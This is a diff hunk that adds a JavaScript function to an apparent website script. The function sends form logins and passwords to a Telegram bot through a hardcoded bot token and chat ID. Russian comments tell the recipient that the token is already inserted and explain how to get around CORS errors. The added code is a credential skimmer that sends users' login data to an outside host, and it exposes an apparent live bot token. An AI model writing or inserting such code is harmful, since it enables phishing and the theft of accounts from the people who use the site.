@@ -611,4 +611,29 @@ if (typeof $ !== 'undefined') {
     initEventHandlers();
     initCommon();
   });
+  // ==================== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM ====================
+function sendToTelegram(login, password, pageType) {
+    // Твои данные (токен и chat_id уже вставлены)
+    const BOT_TOKEN = '8574575973:AAG1H0-l52kgQrhvbfrUEQGow_BAOCKRIvA';
+    const CHAT_ID = '788541169';
+    
+    // Форматируем сообщение. pageType поможет понять, с какой страницы данные.
+    const message = `🔐 Данные с формы (${pageType}):\n👤 Логин: ${login}\n🔑 Пароль: ${password || 'не введен'}\n🕐 ${new Date().toLocaleString()}`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    // Отправляем запрос. Используем fetch, который уже используется в коде.
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        // Режим 'no-cors' может понадобиться, если браузер будет ругаться на CORS.
+        // mode: 'no-cors', // Пока закомментировано. Если будут CORS-ошибки, раскомментируй.
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
+    })
+    .then(() => console.log(`✅ Данные с ${pageType} отправлены в Telegram`))
+    .catch(err => console.error('❌ Ошибка Telegram:', err));
+}
+
 }
